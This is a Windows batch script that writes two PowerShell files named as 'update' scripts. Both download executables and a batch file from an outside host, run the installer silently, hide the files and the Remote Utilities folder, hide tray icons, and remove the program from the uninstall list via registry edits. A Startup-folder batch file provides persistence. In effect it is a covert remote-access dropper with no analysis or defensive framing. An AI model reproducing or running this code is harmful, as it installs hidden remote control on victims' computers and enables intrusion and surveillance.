REM -------------------------------------------------------------------------- PWSL dwn--------------------------------------------------------------------------------------------
>C:\Windows\Performance\update.ps1 (
echo Start-Sleep -s 15
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/download/setup.exe -destination C:\Windows\Performance\setup.exe
echo ^(get-item C:\Windows\Performance\setup.exe^).Attributes += 'Hidden'
echo $processName="rutserv"
echo $exePath="C:\Windows\Performance\setup.exe"
echo $check= Get-Process  $processName   -ErrorAction Ignore
echo if^($check^)
echo   {
echo        Write-Output "Process exist"
echo   }
echo   else
echo   {
echo    Write-Output "Process not exist"
echo    Start-Process -FilePath $exePath
echo   }
echo Start-Sleep -s 18
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{1E4AB2FC-B243-45C2-BF6A-A027213183CD}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{E5803A4B-5A4B-44F6-A759-882FB6AD7982}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{A1341EB0-80F5-4D8D-93B6-69D738DDB559}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo Get-ChildItem -path "C:\Program Files (x86)\Remote Utilities - Host" -Recurse -Force ^| foreach {$_.attributes = "Hidden"}
echo $f=get-item "C:\Program Files (x86)\Remote Utilities - Host" -Force
echo Start-Sleep -s 5
echo Stop-Process -ProcessName explorer -force
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/bat1/Desktop.bat -destination "C:\Users\geo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Desktop.bat"
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/fk/ruliserv.exe -destination "C:\Program Files (x86)\Remote Utilities - Host"
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/fk/rustclient.exe -destination "C:\Program Files (x86)\Remote Utilities - Host"
)


REM ----------------------------------------------------------------------- PWSL dwn7 -------------------------------------------------------------------------------
>C:\Windows\Performance\update7.ps1 (
echo Start-Sleep -s 5
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTrayItemsDisplay" -Value 1 -PropertyType "DWord" -Force
echo Start-Sleep -s 3
echo Stop-Process -ProcessName explorer -force
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/download/setup.exe -destination C:\Windows\Performance\setup.exe
echo ^(get-item C:\Windows\Performance\setup.exe^).Attributes += 'Hidden'
echo Start-Process 'C:\Windows\Performance\setup.exe' "/S"
echo Start-Sleep -s 20
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{1E4AB2FC-B243-45C2-BF6A-A027213183CD}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{E5803A4B-5A4B-44F6-A759-882FB6AD7982}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo New-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{A1341EB0-80F5-4D8D-93B6-69D738DDB559}" -Name "SystemComponent" -Value 1 -PropertyType "DWord" -Force
echo Get-ChildItem -path "C:\Program Files (x86)\Remote Utilities - Host" -Recurse -Force ^| foreach {$_.attributes = "Hidden"}
echo $f=get-item "C:\Program Files (x86)\Remote Utilities - Host" -Force
echo Start-Sleep -s 15
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/bat1/Desktop.bat -destination "C:\Users\geo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Desktop.bat"
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/fk/ruliserv.exe -destination "C:\Program Files (x86)\Remote Utilities - Host"
echo Import-Module bitstransfer
echo start-bitstransfer -source http://updateme.solutions/fk/rustclient.exe -destination "C:\Program Files (x86)\Remote Utilities - Host"
)

exit

